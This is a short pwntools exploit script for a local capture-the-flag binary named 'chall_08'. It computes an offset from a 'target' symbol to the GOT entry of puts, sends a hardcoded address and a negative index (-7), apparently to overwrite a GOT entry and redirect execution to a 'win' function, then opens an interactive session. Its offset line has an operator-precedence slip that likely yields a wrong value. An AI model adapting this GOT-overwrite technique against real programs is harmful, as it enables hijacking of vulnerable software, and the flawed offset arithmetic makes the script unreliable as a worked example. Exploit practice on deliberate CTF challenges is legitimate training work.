from pwn import *
#load binary and get offset
elf=ELF("./chall_08")
offset=elf.sym.target-elf.sym.got['puts']//8
print("value",offset)
r=process("./chall_08")
r.sendline("4198950")
r.sendline("-7")
print(elf.sym.win)
r.interactive()
r.close()
